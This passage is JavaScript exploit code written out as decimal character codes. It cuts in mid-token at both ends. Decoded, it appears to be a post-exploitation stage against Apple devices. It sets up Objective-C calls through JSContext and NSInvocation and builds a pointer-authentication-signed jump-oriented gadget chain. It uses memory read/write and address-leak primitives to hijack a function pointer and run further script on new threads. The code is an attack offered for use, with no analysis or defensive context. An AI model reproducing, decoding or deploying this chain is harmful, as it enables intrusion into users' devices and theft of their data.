105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 107, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 108, 101, 97, 115, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 58, 97, 116, 73, 110, 100, 101, 120, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 116, 97, 114, 116, 34, 41, 41, 59, 10, 10, 108, 101, 116, 32, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 73, 110, 118, 111, 99, 97, 116, 105, 111, 110, 34, 41, 59, 10, 108, 101, 116, 32, 106, 115, 99, 95, 99, 108, 97, 115, 115, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 74, 83, 67, 111, 110, 116, 101, 120, 116, 34, 41, 59, 10, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 84, 104, 114, 101, 97, 100, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 99, 115, 116, 114, 105, 110, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 41, 59, 10, 125, 10, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 78, 97, 78, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 111, 98, 106, 44, 32, 115, 101, 108, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 44, 32, 115, 101, 108, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 111, 98, 106, 44, 32, 115, 105, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 44, 32, 115, 105, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 111, 98, 106, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 111, 98, 106, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 32, 61, 32, 109, 97, 108, 108, 111, 99, 40, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 50, 48, 48, 110, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 56, 110, 44, 32, 112, 97, 99, 105, 97, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 52, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 44, 32, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 52, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 56, 110, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 45, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 48, 120, 52, 49, 52, 49, 52, 49, 52, 49, 110, 44, 32, 48, 120, 67, 50, 68, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 32, 58, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 115, 112, 97, 119, 110, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 120, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 115, 116, 114, 105, 110, 103, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 111, 98, 106, 101, 99, 116, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 105, 110, 32, 116, 104, 105, 115, 32, 99, 97, 115, 101, 44, 32, 105, 116, 39, 115, 32, 97, 108, 114, 101, 97, 100, 121, 32, 97, 32, 67, 70, 83, 116, 114, 105, 110, 103, 44, 32, 115, 111, 32, 108, 101, 116, 39, 115, 32, 106, 117, 115, 116, 32, 99, 111, 112, 121, 32, 105, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 61, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 32, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 93, 59, 10, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 106, 115, 99, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 97, 100, 100, 114, 111, 102, 32, 112, 114, 105, 109, 115, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 